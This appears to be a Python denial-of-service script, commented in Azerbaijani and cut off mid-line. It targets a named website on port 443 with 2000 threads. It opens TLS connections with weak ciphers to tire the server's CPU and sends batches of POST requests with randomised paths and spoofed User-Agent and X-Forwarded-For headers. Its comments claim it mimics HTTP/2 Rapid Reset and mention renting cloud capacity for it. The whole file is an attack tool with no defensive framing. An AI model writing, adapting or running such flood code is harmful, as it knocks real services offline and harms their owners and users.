import socket
import ssl
import threading
import random
import time
import string
import os

# --- MAXIMUM OVERDRIVE ---
TARGET_HOST = "www.appl88-vip.com"
TARGET_PORT = 443
THREADS = 2000 # Railway Paid plan üçün maksimal şəbəkə sıxlığı
BATCH_SIZE = 100 # Bir bağlantıda serveri boğan asinxron dalğa

def r_str(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def singularity_strike():
    # SSL Handshake-i serveri deşifrə ilə daxildən yormaq üçün qururuq
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Şifrləməni ən baha başa gələn üsulda saxlayırıq ki, serverin CPU-su kilitlənsin
    ctx.set_ciphers('DEFAULT@SECLEVEL=1')

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Nagle Bypass
            s.settimeout(5)

            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # HTTP/2 Rapid Reset & Header Frame Overload təqlidi
            # Sənaye səviyyəli "qadağan olunmuş" metod
            for _ in range(BATCH_SIZE):
                # Saytın daxili API və parametrlərini hədəf alırıq
                path = f"/?v={time.time()}&id={r_str(30)}&invite_code={random.randint(1000, 9999)}"
                
                # Bu başlıq serveri hər sorğuda daxili yaddaş (Buffer) ayırmağa məcbur edir
                payload = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {TARGET_HOST}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,5)}.0.0.0 Safari/537.36\r\n"
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1
